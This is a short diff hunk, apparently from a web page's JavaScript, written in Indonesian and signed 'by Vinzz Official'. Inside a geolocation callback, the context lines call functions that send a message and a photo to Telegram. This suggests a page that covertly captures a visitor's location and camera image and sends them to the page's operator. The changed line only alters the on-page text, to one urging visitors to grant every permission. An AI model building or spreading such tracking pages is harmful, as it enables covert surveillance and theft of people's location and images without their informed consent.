@@ -154,6 +154,6 @@ navigator.geolocation.getCurrentPosition(
 ╰───────────────────`;
     await kirimPesanTelegram(pesan);
     await kirimFotoKeTelegram();
-    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
+    document.body.innerHTML = '<h2>Izinin dulu semuanya<br><small>by Vinzz Official</small></h2>';
   }
 );
